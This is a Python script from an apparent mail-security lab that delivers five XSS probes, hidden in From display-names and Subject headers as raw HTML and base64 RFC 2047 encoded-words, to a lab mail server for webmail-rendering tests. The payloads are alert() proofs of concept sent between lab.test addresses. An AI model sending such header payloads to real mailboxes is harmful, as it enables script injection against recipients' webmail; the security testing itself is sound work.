"""A-line: header-content injection into webmail rendering.

Payloads in From display-name and Subject (raw HTML and RFC 2047 encoded-word
variants). Survival as executable DOM nodes is checked in the browser; this
script only delivers the probes and stores copies.
"""
from __future__ import annotations

import json
import subprocess
import sys
import time
from pathlib import Path

RUN = Path("/mnt/e/MailSecLab/received-lab/results/research/w2-20261002a")
STAGE = RUN / "xssprobe"
EVIDENCE = "/evidence/w2-20261002a/xssprobe"

import base64
B64_SCRIPT = base64.b64encode(b"<script>alert(1)</script>").decode()
B64_IMG = base64.b64encode(b'<img src=x onerror="alert(2)">').decode()

CASES = [
    {"name": "x1-2047-script-dn", "from": f"=?utf-8?B?{B64_SCRIPT}?= <xss1@lab.test>", "subject": "xss probe x1"},
    {"name": "x2-raw-img-dn", "from": '<img src=x onerror="alert(2)"> <xss2@lab.test>', "subject": "xss probe x2"},
    {"name": "x3-quote-break", "from": '""><script>alert(3)</script>" <xss3@lab.test>', "subject": "xss probe x3"},
    {"name": "x4-2047-subject", "from": "Probe <xss4@lab.test>", "subject": f"=?utf-8?B?{B64_SCRIPT}?="},
    {"name": "x5-2047-img-dn", "from": f"=?utf-8?B?{B64_IMG}?= <xss5@lab.test>", "subject": "xss probe x5"},
]


def sh(args, timeout=90):
    proc = subprocess.run(args, stdout=subprocess.PIPE, stderr=subprocess.PIPE, timeout=timeout, check=False)
    return proc.returncode, proc.stdout.decode("utf-8", "replace"), proc.stderr.decode("utf-8", "replace")


def main() -> None:
    STAGE.mkdir(parents=True, exist_ok=True)
    for case in CASES:
        case_id = "xss-" + case["name"]
        raw = (f"From: {case['from']}\r\n".encode("utf-8")
               + b"To: bob@lab.test\r\n"
               b"Date: Sat, 3 Oct 2026 17:00:00 +0000\r\n"
               + f"Subject: {case['subject']}\r\n".encode("utf-8")
               + f"Message-ID: <{case_id}@lab.test>\r\n".encode()
               + f"X-Case-ID: {case_id}\r\n".encode()
               + b"\r\nPlease confirm the payment.\r\n")
        (STAGE / f"{case['name']}.eml").write_bytes(raw)
        code, out, err = sh([
            "docker", "exec", "msl-client", "python3", "/opt/research/lib/smtp_send.py",
            "--server", "msl-auth-postfix", "--port", "25",
            "--mail-from", "alice@lab.test", "--rcpt-to", "bob@lab.test",
            "--input", f"{EVIDENCE}/{case['name']}.eml",
            "--transcript", f"{EVIDENCE}/{case['name']}.smtp.txt",
        ], timeout=60)
        try:
            sent = json.loads(out)
        except json.JSONDecodeError:
            sent = {"accepted": False}
        print(case["name"], "->", (sent.get("reply") or "")[:40], flush=True)
        time.sleep(1.2)


if __name__ == "__main__":
    main()
